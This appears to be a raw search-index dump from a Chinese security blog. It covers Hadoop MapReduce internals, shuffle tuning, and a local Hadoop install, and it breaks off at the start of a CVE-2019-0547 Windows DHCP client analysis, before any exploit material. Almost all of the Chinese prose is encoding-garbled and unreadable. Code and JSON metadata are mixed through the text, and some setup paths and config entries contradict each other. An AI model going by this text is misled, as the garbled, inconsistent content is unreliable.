Text(), 0, (int) Math.min((long) Integer.MAX_VALUE, end - start)); } this.pos = start; } public boolean nextKeyValue() throws IOException { if (key == null) { key = new LongWritable(); } key.set(pos);// ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:2","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"3. Mapper ä¸»è¦æ˜¯è¯»å–InputSplitçš„æ¯ä¸€ä¸ªKey,Valueå¯¹å¹¶è¿›è¡Œå¤„ç†ï¼š public class Mapper\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { /** * é¢„å¤„ç†ï¼Œä»…åœ¨map taskå¯åŠ¨æ—¶è¿è¡Œä¸€æ¬¡ */ protected void setup(Context context) throws IOException, InterruptedException { } /** * å¯¹äºInputSplitä¸­çš„æ¯ä¸€å¯¹\u003ckey, value\u003eéƒ½ä¼šè¿è¡Œä¸€æ¬¡ */ @SuppressWarnings(\"unchecked\") protected void map(KEYIN key, VALUEIN value, Context context) throws IOException, InterruptedException { context.write((KEYOUT) key, (VALUEOUT) value); } /** * æ‰«å°¾å·¥ä½œï¼Œæ¯”å¦‚å…³é—­æµç­‰ */ protected void cleanup(Context context) throws IOException, InterruptedException { } /** * map taskçš„é©±åŠ¨å™¨ */ public void run(Context context) throws IOException, InterruptedException { setup(context); while (context.nextKeyValue()) { map(context.getCurrentKey(), context.getCurrentValue(), context); } cleanup(context); } } public class MapContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e extends TaskInputOutputContext\u003cKEYIN, VALUEIN, KEYOUT, VALUEOUT\u003e { private RecordReader\u003cKEYIN, VALUEIN\u003e reader; private InputSplit split; /** * Get the input split for this map. */ public InputSplit getInputSplit() { return split; } @Override public KEYIN getCurrentKey() throws IOException, InterruptedException { return reader.getCurrentKey(); } @Override public VALUEIN getCurrentValue() throws IOException, InterruptedException { return reader.getCurrentValue(); } @Override public boolean nextKeyValue() throws IOException, InterruptedException { return reader.nextKeyValue(); } } ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:3","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"4.Shuffle å¯¹Mapçš„ç»“æœè¿›è¡Œæ’åºå¹¶ä¼ è¾“åˆ°Reduceè¿›è¡Œå¤„ç† Mapçš„ç»“æœå¹¶ä¸æ˜¯ç›´æ¥å­˜æ”¾åˆ°ç¡¬ç›˜,è€Œæ˜¯åˆ©ç”¨ç¼“å­˜åšä¸€äº›é¢„æ’åºå¤„ç† Mapä¼šè°ƒç”¨Combinerï¼Œå‹ç¼©ï¼ŒæŒ‰keyè¿›è¡Œåˆ†åŒºã€æ’åºç­‰ï¼Œå°½é‡å‡å°‘ç»“æœçš„å¤§å° æ¯ä¸ªMapå®Œæˆåéƒ½ä¼šé€šçŸ¥Taskï¼Œç„¶åReduceå°±å¯ä»¥è¿›è¡Œå¤„ç† Mapç«¯ å½“Mapç¨‹åºå¼€å§‹äº§ç”Ÿç»“æœçš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯ç›´æ¥å†™åˆ°æ–‡ä»¶çš„ï¼Œè€Œæ˜¯åˆ©ç”¨ç¼“å­˜åšä¸€äº›æ’åºæ–¹é¢çš„é¢„å¤„ç†æ“ä½œ æ¯ä¸ªMapä»»åŠ¡éƒ½æœ‰ä¸€ä¸ªå¾ªç¯å†…å­˜ç¼“å†²åŒºï¼ˆé»˜è®¤100MBï¼‰ï¼Œå½“ç¼“å­˜çš„å†…å®¹è¾¾åˆ°80%æ—¶ï¼Œåå°çº¿ç¨‹å¼€å§‹å°†å†…å®¹å†™åˆ°æ–‡ä»¶ï¼Œæ­¤æ—¶Mapä»»åŠ¡å¯ä»¥ç»§ç»­è¾“å‡ºç»“æœï¼Œä½†å¦‚æœç¼“å†²åŒºæ»¡äº†ï¼ŒMapä»»åŠ¡åˆ™éœ€è¦ç­‰å¾… å†™æ–‡ä»¶ä½¿ç”¨round-robinæ–¹å¼ã€‚åœ¨å†™å…¥æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆå°†æ•°æ®æŒ‰ç…§Reduceè¿›è¡Œåˆ†åŒºã€‚å¯¹äºæ¯ä¸€ä¸ªåˆ†åŒºï¼Œéƒ½ä¼šåœ¨å†…å­˜ä¸­æ ¹æ®keyè¿›è¡Œæ’åºï¼Œå¦‚æœé…ç½®äº†Combinerï¼Œåˆ™æ’åºåæ‰§è¡ŒCombinerï¼ˆCombineä¹‹åå¯ä»¥å‡å°‘å†™å…¥æ–‡ä»¶å’Œä¼ è¾“çš„æ•°æ®ï¼‰ æ¯æ¬¡ç»“æœè¾¾åˆ°ç¼“å†²åŒºçš„é˜€å€¼æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨Mapç»“æŸæ—¶ï¼Œå¯èƒ½ä¼šäº§ç”Ÿå¤§é‡çš„æ–‡ä»¶ã€‚åœ¨Mapå®Œæˆå‰ï¼Œä¼šå°†è¿™äº›æ–‡ä»¶è¿›è¡Œåˆå¹¶å’Œæ’åºã€‚å¦‚æœæ–‡ä»¶çš„æ•°é‡è¶…è¿‡3ä¸ªï¼Œåˆ™åˆå¹¶åä¼šå†æ¬¡è¿è¡ŒCombinerï¼ˆ1ã€2ä¸ªæ–‡ä»¶å°±æ²¡æœ‰å¿…è¦äº†ï¼‰ å¦‚æœé…ç½®äº†å‹ç¼©ï¼Œåˆ™æœ€ç»ˆå†™å…¥çš„æ–‡ä»¶ä¼šå…ˆè¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å¯ä»¥å‡å°‘å†™å…¥å’Œä¼ è¾“çš„æ•°æ® ä¸€æ—¦Mapå®Œæˆï¼Œåˆ™é€šçŸ¥ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ­¤æ—¶Reduceå°±å¯ä»¥å¼€å§‹å¤åˆ¶ç»“æœæ•°æ® Reduceç«¯ Mapçš„ç»“æœæ–‡ä»¶éƒ½å­˜æ”¾åˆ°è¿è¡ŒMapä»»åŠ¡çš„æœºå™¨çš„æœ¬åœ°ç¡¬ç›˜ä¸­ å¦‚æœMapçš„ç»“æœå¾ˆå°‘ï¼Œåˆ™ç›´æ¥æ”¾åˆ°å†…å­˜ï¼Œå¦åˆ™å†™å…¥æ–‡ä»¶ä¸­ åŒæ—¶åå°çº¿ç¨‹å°†è¿™äº›æ–‡ä»¶è¿›è¡Œåˆå¹¶å’Œæ’åºåˆ°ä¸€ä¸ªæ›´å¤§çš„æ–‡ä»¶ä¸­ï¼ˆå¦‚æœæ–‡ä»¶æ˜¯å‹ç¼©çš„ï¼Œåˆ™éœ€è¦å…ˆè§£å‹ï¼‰ å½“æ‰€æœ‰çš„Mapç»“æœéƒ½è¢«å¤åˆ¶å’Œåˆå¹¶åï¼Œå°±ä¼šè°ƒç”¨Reduceæ–¹æ³• Reduceç»“æœä¼šå†™å…¥åˆ°HDFSä¸­ è°ƒä¼˜ ä¸€èˆ¬çš„åŸåˆ™æ˜¯ç»™shuffleåˆ†é…å°½å¯èƒ½å¤šçš„å†…å­˜ï¼Œä½†å‰ææ˜¯è¦ä¿è¯Mapã€Reduceä»»åŠ¡æœ‰è¶³å¤Ÿçš„å†…å­˜ å¯¹äºMapï¼Œä¸»è¦å°±æ˜¯é¿å…æŠŠæ–‡ä»¶å†™å…¥ç£ç›˜ï¼Œä¾‹å¦‚ä½¿ç”¨Combinerï¼Œå¢å¤§io.sort.mbçš„å€¼ å¯¹äºReduceï¼Œä¸»è¦æ˜¯æŠŠMapçš„ç»“æœå°½å¯èƒ½åœ°ä¿å­˜åˆ°å†…å­˜ä¸­ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¦é¿å…æŠŠä¸­é—´ç»“æœå†™å…¥ç£ç›˜ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„å†…å­˜éƒ½æ˜¯åˆ†é…ç»™Reduceæ–¹æ³•çš„ï¼Œå¦‚æœReduceæ–¹æ³•ä¸æ€ä¹ˆæ¶ˆè€—å†…å­˜ï¼Œå¯ä»¥mapred.inmem.merge.thresholdè®¾æˆ0ï¼Œmapred.job.reduce.input.buffer.percentè®¾æˆ1.0 åœ¨ä»»åŠ¡ç›‘æ§ä¸­å¯é€šè¿‡Spilled records counteræ¥ç›‘æ§å†™å…¥ç£ç›˜çš„æ•°ï¼Œä½†è¿™ä¸ªå€¼æ˜¯åŒ…æ‹¬mapå’Œreduceçš„ å¯¹äºIOæ–¹é¢ï¼Œå¯ä»¥Mapçš„ç»“æœå¯ä»¥ä½¿ç”¨å‹ç¼©ï¼ŒåŒæ—¶å¢å¤§buffer sizeï¼ˆio.file.buffer.sizeï¼Œé»˜è®¤4kbï¼‰ é…ç½® å±æ€§ é»˜è®¤å€¼ æè¿° io.sort.mb 100 æ˜ å°„è¾“å‡ºåˆ†ç±»æ—¶æ‰€ä½¿ç”¨ç¼“å†²åŒºçš„å¤§å°. io.sort.record.percent 0.05 å‰©ä½™ç©ºé—´ç”¨äºæ˜ å°„è¾“å‡ºè‡ªèº«è®°å½•.åœ¨1.Xå‘å¸ƒåå»é™¤æ­¤å±æ€§.éšæœºä»£ç ç”¨äºä½¿ç”¨æ˜ å°„æ‰€æœ‰å†…å­˜å¹¶è®°å½•ä¿¡æ¯. io.sort.spill.percent 0.80 é’ˆå¯¹æ˜ å°„è¾“å‡ºå†…å­˜ç¼“å†²å’Œè®°å½•ç´¢å¼•çš„é˜ˆå€¼ä½¿ç”¨æ¯”ä¾‹. io.sort.factor 10 æ–‡ä»¶åˆ†ç±»æ—¶åˆå¹¶æµçš„æœ€å¤§æ•°é‡ã€‚æ­¤å±æ€§ä¹Ÿç”¨äºreduceã€‚é€šå¸¸æŠŠæ•°å­—è®¾ä¸º100. min.num.spills.for.combine 3 ç»„åˆè¿è¡Œæ‰€éœ€æœ€å°æº¢å‡ºæ–‡ä»¶æ•°ç›®. mapred.compress.map.output false å‹ç¼©æ˜ å°„è¾“å‡º. mapred.map.output.compression.codec DefaultCodec æ˜ å°„è¾“å‡ºæ‰€éœ€çš„å‹ç¼©è§£ç¼–ç å™¨. mapred.reduce.parallel.copies 5 ç”¨äºå‘reducerä¼ é€æ˜ å°„è¾“å‡ºçš„çº¿ç¨‹æ•°ç›®. mapred.reduce.copy.backoff 300 æ—¶é—´çš„æœ€å¤§æ•°é‡ï¼Œä»¥ç§’ä¸ºå•ä½ï¼Œè¿™æ®µæ—¶é—´å†…è‹¥reducerå¤±è´¥åˆ™ä¼šåå¤å°è¯•ä¼ è¾“ io.sort.factor 10 ç»„åˆè¿è¡Œæ‰€éœ€æœ€å¤§æº¢å‡ºæ–‡ä»¶æ•°ç›®. mapred.job.shuffle.input.buffer.percent 0.70 éšæœºå¤åˆ¶é˜¶æ®µæ˜ å°„è¾“å‡ºç¼“å†²å™¨çš„å †æ ˆå¤§å°æ¯”ä¾‹ mapred.job.shuffle.merge.percent 0.66 ç”¨äºå¯åŠ¨åˆå¹¶è¾“å‡ºè¿›ç¨‹å’Œç£ç›˜ä¼ è¾“çš„æ˜ å°„è¾“å‡ºç¼“å†²å™¨çš„é˜€å€¼ä½¿ç”¨æ¯”ä¾‹ mapred.inmem.merge.threshold 1000 ç”¨äºå¯åŠ¨åˆå¹¶è¾“å‡ºå’Œç£ç›˜ä¼ è¾“è¿›ç¨‹çš„æ˜ å°„è¾“å‡ºçš„é˜€å€¼æ•°ç›®ã€‚å°äºç­‰äº0æ„å‘³ç€æ²¡æœ‰é—¨æ§›ï¼Œè€Œæº¢å‡ºè¡Œä¸ºç”± mapred.job.shuffle.merge.percentå•ç‹¬ç®¡ç†. mapred.job.reduce.input.buffer.percent 0.0 ç”¨äºå‡å°‘å†…å­˜æ˜ å°„è¾“å‡ºçš„å †æ ˆå¤§å°æ¯”ä¾‹ï¼Œå†…å­˜ä¸­æ˜ å°„å¤§å°ä¸å¾—è¶…å‡ºæ­¤å€¼ã€‚è‹¥reduceréœ€è¦è¾ƒå°‘å†…å­˜åˆ™å¯ä»¥æé«˜è¯¥å€¼. ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:4","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"5. ç¼–ç¨‹ å¤„ç† selectï¼šç›´æ¥åˆ†æè¾“å…¥æ•°æ®ï¼Œå–å‡ºéœ€è¦çš„å­—æ®µæ•°æ®å³å¯ where: ä¹Ÿæ˜¯å¯¹è¾“å…¥æ•°æ®å¤„ç†çš„è¿‡ç¨‹ä¸­è¿›è¡Œå¤„ç†ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦è¯¥æ•°æ® aggregation:min, max, sum group by: é€šè¿‡Reducerå®ç° sort join: map join, reduce join Third-Party Libraries # ç¬¬ä¸€ç§ export LIBJARS=$MYLIB/commons-lang-2.3.jar, hadoop jar prohadoop-0.0.1-SNAPSHOT.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner -libjars $LIBJARS #ç¬¬äºŒç§ hadoop jar prohadoop-0.0.1-SNAPSHOT-jar-with-dependencies.jar org.aspress.prohadoop.c3. WordCountUsingToolRunner The dependent libraries are now included inside the application JAR file ä¸€èˆ¬è¿˜æ˜¯ç¬¬ä¸€ç§çš„å¥½ï¼ŒæŒ‡å®šä¾èµ–å¯ä»¥åˆ©ç”¨Public Cacheï¼Œå¦‚æœæ˜¯åŒ…å«ä¾èµ–ï¼Œåˆ™æ¯æ¬¡éƒ½éœ€è¦æ‹·è´ã€‚ ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:3:5","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"å››ã€å‚è€ƒæ–‡çŒ® w3 school MapReduce Design Patterns ","date":"2019-10-16","objectID":"/2019/10/hadoop3/:4:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(ä¸‰)--MapReduce","uri":"/2019/10/hadoop3/"},{"categories":["Vuln"],"content":"Hadoop--åˆå­¦åˆ°æ¼æ´","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"Hadoopâ€“åˆå­¦åˆ°æ¼æ´(äºŒ)â€“ç¯å¢ƒæ­å»ºâ€“æœ¬æœºæ¨¡å¼ ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:0:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"å‰è¨€ æœ‰æ¡ä»¶çš„ä¹°ä¸€ç»„æœåŠ¡å™¨åšé›†ç¾¤ï¼Œæ²¡æœ‰æ¡ä»¶çš„é…ç½®é«˜æ€§èƒ½æœºå™¨æ­å»ºè™šæ‹Ÿæœºã€‚æ­¤å¤„ä»¥è™šæ‹Ÿæœºè¿›è¡Œæ­å»ºé›†ç¾¤ï¼ˆå¤šä¸ªLinuxä¸»æœºï¼‰ã€‚ ç¬¬ä¸€æ¬¡é¦–å…ˆè¿›è¡Œæœ¬æœºæ¨¡å¼çš„Hadoopæ­å»ºã€‚ ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:1:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"ä¸€ã€è™šæ‹Ÿæœº centos7, åˆ›å»ºæ–°ç”¨æˆ·ï¼Œå…·æœ‰rootæƒé™ã€‚ åœ¨/optç›®å½•ä¸‹åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ†åˆ«ä¸ºmoduleså’Œsoftware sudo mkdir modules sudo mkdir software ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:2:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"äºŒã€JAVAç¯å¢ƒé…ç½® centos7è‡ªå¸¦javaç¯å¢ƒï¼Œä½†è‡ªå¸¦çš„openjdkæ²¡æœ‰å¢åŠ å¯¹javaç›‘æ§å‘½ä»¤jpsçš„æ”¯æŒï¼Œä¸¤ç§è§£å†³æ–¹æ¡ˆï¼šå¸è½½åŸæœ‰çš„openjdkè¿›è¡Œå†é‡è£…æˆ–è€…é€šè¿‡yumå®‰è£…jdkå¼€å‘æ’ä»¶ã€‚æ­¤å¤„æˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸€ç§è§£å†³æ–¹æ¡ˆï¼š ä¸‹è½½Oracleç‰ˆæœ¬JDKï¼Œjdk-7u67-linux-x64.tar.gzï¼Œå¹¶è§£å‹ï¼Œç„¶åé…ç½®å¥½ç¯å¢ƒå˜é‡ï¼š tar -zxvf jdk-7u67-linux-x64.tar.gz -C /opt/modules export JAVA_HOME=/usr/local/jdk1.7.0_67 export PATH=$JAVA_HOME/bin:$PATH å¯¹javaç¯å¢ƒè¿›è¡ŒéªŒè¯ï¼š ï¼ˆåŠ¡å¿…ç¡®ä¿javaç¯å¢ƒæ­£ç¡®ï¼Œjavaç‰ˆæœ¬å¯ä»¥è‡ªè¡Œå°è¯•ï¼Œæ­¤å¤„æˆ‘ä½¿ç”¨äº†ä¸€ä¸ªè¾ƒè€çš„ç‰ˆæœ¬ï¼‰ ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:3:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"ä¸‰ã€Hadoopç¯å¢ƒé…ç½® ä¸‹è½½Apache Hadoopï¼Œåˆ°å®˜ç½‘ä¸‹è½½å³å¯ï¼Œæ­¤å¤„ä½¿ç”¨çš„æ˜¯Hadoop-2.10.0ï¼ˆå»ºè®®ä½¿ç”¨Binaryï¼Œå› ä¸ºåˆšå¼€å§‹å¯èƒ½ä¸ç†Ÿæ‚‰æºç ç¼–è¯‘ï¼‰ï¼š è¿›å…¥ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªé“¾æ¥ç‚¹å‡»ä¸‹è½½ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨wgetä¸‹è½½ï¼š ä¸‹è½½åçš„æ–‡ä»¶å»ºè®®æ”¾åœ¨/opt/modulesä¸‹é¢ä¸€ä»½ï¼Œç„¶åè§£å‹åˆ°/usr/local/è·¯å¾„ä¸‹ã€‚ åœ¨.bashrcæ–‡ä»¶ä¸­é…ç½®Hadoopçš„ç¯å¢ƒå˜é‡ï¼š export HADOOP_HOME=/usr/local/hadoop-2.10.0 å°è¯•è¿è¡Œï¼šhadoop version å¦‚æœä¸æŠ¥é”™ï¼Œè¯´æ˜å®‰è£…æ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥è·³è¿‡è¿›å…¥ä¸‹é¢çš„éªŒè¯ï¼Œå¦‚æœæ­¤å¤„æŠ¥é”™ï¼š â€‹ è¿è¡Œå…¶ä»–çš„hadoop jarä¹‹ç±»çš„å‘½ä»¤ä¹Ÿæç¤ºæ­¤é—®é¢˜ï¼Œè¯´æ˜ç¯å¢ƒå˜é‡é…ç½®å­˜åœ¨é—®é¢˜ï¼Œå¯ä»¥å°è¯•é‡‡ç”¨ä»¥ä¸‹è§£å†³æ–¹å¼ï¼š â€‹ åœ¨.bashrcä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š export HADOOP_HOME=/usr/local/hadoop-2.10.0 #hadoopçš„ç¯å¢ƒå˜é‡ï¼Œå‰é¢å·²ç»è®¾ç½®è¿‡ export HADOOP_INSTALL=$HADOOP_HOME export HADOOP_MAPRED_HOME=$HADOOP_HOME export HADOOP_COMMON_HOME=$HADOOP_HOME export HADOOP_HDFS_HOME=$HADOOP_HOME export YARN_HOME=$HADOOP_HOME export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin export HADOOP_CONF_DIR=$HADOOP_HOME export HADOOP_PREFIX=$HADOOP_HOME export HADOOP_LIBEXEC_DIR=$HADOOP_HOME/libexec export JAVA_LIBRARY_PATH=$HADOOP_HOME/lib/native:$JAVA_LIBRARY_PATH export HADOOP_CONF_DIR=$HADOOP_PREFIX/etc/hadoop â€‹ ç„¶åè¿›è¡Œ source ~/.bashrcï¼Œæ­¤æ—¶å†è¿è¡Œhadoop versionè¿›è¡ŒéªŒè¯ï¼š ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:4:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"å››ã€ç¯å¢ƒéªŒè¯ éªŒè¯ä¸€ä¸ªç®€å•çš„Hadoopç¤ºä¾‹ã€‚ Hadoopå®‰è£…æä¾›äº†ä»¥ä¸‹ç¤ºä¾‹MapReduce jaræ–‡ä»¶ï¼Œå®ƒæä¾›äº†MapReduceçš„åŸºæœ¬åŠŸèƒ½ï¼Œå¯ç”¨äºè®¡ç®—ï¼Œå¦‚Piå€¼ï¼Œæ–‡ä»¶åˆ—è¡¨ä¸­çš„å­—æ•°ç­‰ã€‚ æ–°å»ºç›®å½•ï¼šmkdir /tmp/input æ‹·è´å‡ ä¸ªtxtæ–‡ä»¶ï¼šcp $HADOOP_HOME/*.txt input æ£€æŸ¥å¾…æµ‹æ–‡ä»¶ï¼š ls -l input #è¾“å‡º total 124 -rw-r--r-- 1 root root 106210 Mar 5 22:54 LICENSE.txt -rw-r--r-- 1 root root 15841 Mar 5 22:54 NOTICE.txt -rw-r--r-- 1 root root 1366 Mar 5 22:54 README.txt è¿è¡Œå‘½ä»¤è¿›è¡Œæ¯ä¸ªå¯ç”¨æ–‡ä»¶çš„å­—æ•°ç»Ÿè®¡ï¼š hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.10.0.jar wordcount input output è¾“å‡ºä¿å­˜åœ¨output / part-r00000æ–‡ä»¶ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ï¼š cat output/* æ£€æŸ¥ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š å› ä¸ºæ£€æŸ¥æ–‡ä»¶ä¸åŒå¯èƒ½ç»“æœä¸åŒï¼Œå¯ä»¥æ­£å¸¸ç»Ÿè®¡æ–‡ä»¶çš„å­—æ•°å³å¯ã€‚ ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:5:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"äº”ã€æ€»ç»“ æœ¬æœºæ¨¡å¼çš„å®‰è£…é…ç½®ç›¸å¯¹ç®€å•ï¼Œé‡åˆ°é”™è¯¯ç½‘ä¸Šæœä¸€ä¸‹åŸºæœ¬éƒ½å¯ä»¥è§£å†³ï¼Œéœ€è¦æ ¹æ®è‡ªèº«é…ç½®è¿›è¡Œä¸åŒçš„ä¿®æ”¹ã€‚åç»­å°†è¿›è¡Œä¼ªåˆ†å¸ƒå¼å’Œåˆ†å¸ƒå¼ç¯å¢ƒçš„é…ç½®ã€‚ ","date":"2019-10-15","objectID":"/2019/10/hadoop2-1/:6:0","tags":["Hadoop"],"title":"Hadoop--åˆå­¦åˆ°æ¼æ´(äºŒ)--ç¯å¢ƒæ­å»º--æœ¬æœºæ¨¡å¼","uri":"/2019/10/hadoop2-1/"},{"categories":["Vuln"],"content":"CVE-2019-0547æ¼æ´ç®€å•åˆ†æ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"CVE-2019-0547 Analyse ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:0","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"æ¼æ´æè¿° CVE-2019-0547ï¼Œä¸€ä¸ªWindowsç³»ç»Ÿä¸‹DHCPå®¢æˆ·ç«¯çš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´çš„ä¸»è¦åŸå› æ˜¯å¯¹DHCPæ¶ˆæ¯çš„é”™è¯¯çš„å¤„ç†æ–¹å¼é€ æˆå†…å­˜æŸåã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„DHCPå“åº”æ•°æ®åŒ…åˆ°å­˜åœ¨æ¼æ´çš„ç³»ç»Ÿä¸­æ¥è§¦å‘æ¼æ´ï¼Œæœ€ç»ˆå¯ä»¥å®ç°ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œä»»æ„ä»£ç ï¼Œå±å®³å·¨å¤§ã€‚ ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:1","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"æ¼æ´å½±å“èŒƒå›´ â€¢ Microsoft Windows10 version1803 â€¢ Microsoft Windows Serverversion 1803(ServerCoreInstallation) è¯¥æ¼æ´å½±å“çš„ç³»ç»Ÿç‰ˆæœ¬åªæœ‰ä¸¤ä¸ªï¼Œä½†æ˜¯éšç€ç³»ç»Ÿç‰ˆæœ¬è¿­ä»£ï¼Œç°åœ¨ä½¿ç”¨Windows 10çš„äººè¶Šæ¥è¶Šå¤šï¼Œè¿™ä¸ªæ¼æ´è¿˜æ˜¯éœ€è¦å…³æ³¨çš„ã€‚ ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:2","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"æ¼æ´åŸºæœ¬ä¿¡æ¯ æ¼æ´è§¦å‘æ–‡ä»¶ï¼šDHCPæœåŠ¡ä¸»æœºä¸Šè¿è¡Œçš„dcpcore.dll æ¼æ´è§¦å‘å‡½æ•°ï¼šdhcpcore!DecodeDomainSearchListData() æ¼æ´è§¦å‘æ•°æ®å¯¹è±¡ï¼šä¸€ä¸ªåŸæœ¬ç”¨äºå­˜å‚¨åŸŸæœç´¢ç»“æœçš„å †ç¼“å†²åŒº ","date":"2019-10-14","objectID":"/2019/10/cve-2019-0547/:0:3","tags":["æ¼æ´"],"title":"CVE-2019-0547 æ¼æ´åˆ†æ","uri":"/2019/10/cve-2019-0547/"},{"categories":["Vuln"],"content":"æ¼æ´åˆ†æ åŸºç¡€çŸ¥è¯† åŠ¨æ€ä¸»æœºé…ç½®åè®®(DHCP)ï¼Œä¸»è¦ç”¨äºé›†ä¸­ç®¡ç†å’Œè‡ªåŠ¨åŒ–ç½‘ç»œä¸ŠIPåœ°å€çš„åˆ†é…ã€‚ å®ƒæ˜¯BOOTPåè®®çš„æ‰©å±•ã€‚ é™¤äº†IPåœ°å€åˆ†é…å¤–ï¼ŒDHCPå®¢æˆ·ç«¯è¿˜ä»DHCPæœåŠ¡å™¨æ¥æ”¶ç®¡ç†å…¶ç½‘ç»œé…ç½®æ‰€éœ€çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å­ç½‘æ©ç ï¼Œç½‘å…³åœ°å€ï¼ŒDNSæœåŠ¡å™¨åœ°å€ç­‰ã€‚ DHCPä½¿ç”¨UDPç«¯å£67å’Œ68è¿›è¡Œé€šä¿¡ã€‚ DHCPåœ¨æ‰€æœ‰ç°ä»£æ“ä½œç³»ç»Ÿä¸Šéƒ½æ˜¯æ ‡å‡†çš„-å¹¶ä¸”é»˜è®¤æƒ…å†µä¸‹å·²å¯¹ç½‘ç»œæ¥å£å¯ç”¨-åœ¨Microsoft Windowsä¸Šã€‚ å…¸å‹çš„DHCPäº‹åŠ¡æµç¨‹å¦‚ä¸‹ï¼š clientå‘é€DHCP DISCOVERåˆ°server serverå‘é€DHCP OFFERåˆ°client clientå‘é€DHCP REQUESTåˆ°server serverå“åº”ä¸€ä¸ªDHCP ACKåˆ°client 